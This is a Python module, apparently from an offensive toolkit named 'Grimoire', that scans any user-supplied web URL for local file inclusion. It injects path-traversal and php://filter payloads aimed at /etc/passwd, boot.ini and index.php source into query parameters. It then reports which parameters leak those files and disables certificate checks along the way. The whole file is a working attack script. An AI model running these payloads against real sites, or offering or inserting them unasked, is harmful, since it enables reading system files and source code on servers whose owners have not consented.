import os
import requests
import urllib3
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from main import BaseGrimoireModule, BODY_COLOR, RED, WHITE
except ImportError:
    RED, WHITE, BODY_COLOR = Fore.RED, Fore.WHITE, "\033[38;2;255;219;172m"
    class BaseGrimoireModule:
        def __init__(self, mod_id, name, category):
            self.id, self.name, self.category = mod_id, name, category

class Module(BaseGrimoireModule):
    def __init__(self):
        super().__init__(mod_id="8", name="LFI Scanner", category="Web-Vuln")
        self.payloads = [
            "../../../../../../etc/passwd",
            "../../../../../../boot.ini",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        self.common_params = ["page", "file", "view", "path", "include", "lang", "doc"]
        self.indicators = ["root:x:0:0:", "[boot loader]", "PD9waHA", "bin/bash"]

    def _print_row(self, p, pay, stat, col, c1, c2, c3):
        V = RED + "│"
        p_txt = f" {p}"[:c1-1].ljust(c1)
        l_txt = f" {pay}"[:c2-1].ljust(c2)
        s_txt = f" {stat}"[:c3-1].ljust(c3)
        print(f"{V}{BODY_COLOR}{p_txt}{RED}│{BODY_COLOR}{l_txt}{RED}│{col}{s_txt}{RED}│")

    def run(self):
        print(f"\n{RED}┌─────────────────── PAYLOAD LIST ──────────────────┐")
        for i, p in enumerate(self.payloads, 1):
            print(f"{RED}│ {WHITE}{i}. {BODY_COLOR}{p[:45].ljust(45)} {RED}│")
        print(f"{RED}└───────────────────────────────────────────────────┘")

        print(f"{RED}┌──────────────────────────────────────────┐")
        target_url = input(f"{RED}│ {WHITE}URL {RED}> {BODY_COLOR}").strip()
        custom_p = input(f"{RED}│ {WHITE}USE PAYLOAD {RED}> {BODY_COLOR}").strip()
        print(f"{RED}└──────────────────────────────────────────┘")

        if not target_url: return
        if not target_url.startswith(("http://", "https://")):
            target_url = "https://" + target_url

        active_payloads = [custom_p] if custom_p else self.payloads
        os.system('cls' if os.name == 'nt' else 'clear')
        
        c1, c2, c3 = 25, 25, 25
        V = RED + "│"

        print(f"\n{RED}[*] {WHITE}SCANNING LFI: {BODY_COLOR}{target_url}\n")
        print(RED + "┌" + "─"*c1 + "┬" + "─"*c2 + "┬" + "─"*c3 + "┐")
        print(V + WHITE + " PARAMETER".ljust(c1) + RED + "│" + WHITE + " PAYLOAD".ljust(c2) + RED + "│" + WHITE + " STATUS".ljust(c3) + V)
        print(RED + "├" + "─"*c1 + "┼" + "─"*c2 + "┼" + "─"*c3 + "┤")

        try:
            res = requests.get(target_url, timeout=10, verify=False)
            soup = BeautifulSoup(res.content, 'html.parser')
            

            tasks = []
            parsed = urlparse(target_url)
            if parsed.query:
                for q in parsed.query.split('&'):
                    if '=' in q: tasks.append((target_url, q.split('=')[0], q))
            

            if not tasks:
                base_url = target_url.split('?')[0]
                for p in self.common_params:
                    tasks.append((base_url, p, f"{p}=FUZZ"))

            # Прогон тестов
            for url, p_name, pattern in tasks:
                for payload in active_payloads:
                    # Формируем URL для теста
                    if "FUZZ" in pattern:
                        test_url = f"{url}?{pattern.replace('FUZZ', payload)}"
                    else:
                        test_url = url.replace(pattern, f"{p_name}={payload}")
                    
                    try:
                        r = requests.get(test_url, timeout=5, verify=False)
                        if any(ind in r.text for ind in self.indicators):
                            self._print_row(p_name, payload, "VULNERABLE", Fore.GREEN, c1, c2, c3)
                        else:
                            self._print_row(p_name, payload, "SECURE", RED, c1, c2, c3)
                    except:
                        self._print_row(p_name, "error", "TIMEOUT", RED, c1, c2, c3)

        except Exception as e:
            self._print_row("FATAL", "Connection", "ERROR", RED, c1, c2, c3)

        print(RED + "└" + "─"*c1 + "┴" + "─"*c2 + "┴" + "─"*c3 + "┘")